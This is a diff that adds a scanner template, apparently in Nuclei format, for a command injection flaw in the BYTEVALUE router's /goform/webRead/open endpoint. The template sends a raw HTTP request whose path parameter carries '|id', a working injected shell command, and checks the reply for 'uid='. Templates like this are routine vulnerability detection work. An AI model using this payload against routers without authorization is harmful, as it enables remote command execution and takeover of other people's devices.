@@ -1,0 +1,23 @@
+id: BYTEVALUE-path-rce
+info:
+  name: BYTEVALUE-path-rce
+  author: apple
+  severity: critical
+  description: BYTEVALUE 百为流控是一款追求完美上网体验、追求最大带宽利用率的多功能路由器，因其颠覆性的核心功能智能流控而名为百为流控路由器。百为智能流控路由器/goform/webRead/open路由的 path 参数存在命令注入漏洞。攻击者可通过该漏洞在服务器端执行命令，获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s/j-7CqsT4iuwO2NdJOxjFxg
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /goform/webRead/open/?path=|id HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
